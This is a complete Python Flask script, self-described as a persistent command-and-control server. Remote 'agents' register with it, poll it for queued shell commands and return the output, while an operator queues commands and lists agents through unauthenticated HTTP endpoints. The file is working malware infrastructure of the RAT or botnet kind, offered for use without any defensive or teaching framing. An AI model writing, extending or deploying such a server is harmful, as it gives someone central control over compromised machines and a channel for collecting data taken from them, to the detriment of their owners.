#!/usr/bin/env python3
"""
server.py - Minimal persistent command/control server (Python 3.12+ safe)
"""

from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime, UTC

app = Flask(__name__)
DB_FILE = "agents.db"


# ---------- Database Utilities ----------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            last_seen TEXT,
            ip TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            result TEXT,
            status TEXT CHECK(status IN ('pending', 'done')) DEFAULT 'pending',
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()


def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(query, args)
    rv = c.fetchall()
    conn.commit()
    conn.close()
    return (rv[0] if rv else None) if one else rv


init_db()


# ---------- API Endpoints ----------

@app.route('/register', methods=['POST'])
def register():
    agent_id = request.json.get('id')
    ip = request.remote_addr
    now = datetime.now(UTC).isoformat()

    query_db("""
        INSERT OR REPLACE INTO agents (id, last_seen, ip)
        VALUES (?, ?, ?)
    """, (agent_id, now, ip))

    print(f"[+] Agent {agent_id} registered from {ip}")
    return jsonify({'status': 'registered'})


@app.route('/get_command/<agent_id>', methods=['GET'])
def get_command(agent_id):
    cmd_row = query_db("""
        SELECT id, command FROM commands
        WHERE agent_id = ? AND status = 'pending'
        ORDER BY id ASC LIMIT 1
    """, (agent_id,), one=True)

    if cmd_row:
        cmd_id, cmd = cmd_row
        query_db("UPDATE commands SET status = 'done' WHERE id = ?", (cmd_id,))
        return jsonify({'command': cmd})
    return jsonify({'command': None})


@app.route('/post_result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    result = request.json.get('result')
    now = datetime.now(UTC).isoformat()

    query_db("""
        UPDATE commands
        SET result = ?, timestamp = ?
        WHERE agent_id = ? AND status = 'done' AND result IS NULL
        ORDER BY id DESC LIMIT 1
    """, (result, now, agent_id))

    print(f"[{agent_id}] -> {result}")
    return jsonify({'status': 'ok'})


@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')

    query_db("""
        INSERT INTO commands (agent_id, command, status, timestamp)
        VALUES (?, ?, 'pending', ?)
    """, (agent_id, command, datetime.now(UTC).isoformat()))

    print(f"[CMD] Queued for {agent_id}: {command}")
    return jsonify({'status': 'command queued'})


@app.route('/list_agents', methods=['GET'])
def list_agents():
    agents = query_db("SELECT id, last_seen, ip FROM agents")
    return jsonify({'agents': agents})


@app.route('/list_commands/<agent_id>', methods=['GET'])
def list_commands(agent_id):
    cmds = query_db("""
        SELECT id, command, result, status, timestamp
        FROM commands
        WHERE agent_id = ?
        ORDER BY id DESC
    """, (agent_id,))
    return jsonify({'commands': cmds})


if __name__ == '__main__':
    print("[*] Server running on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000)
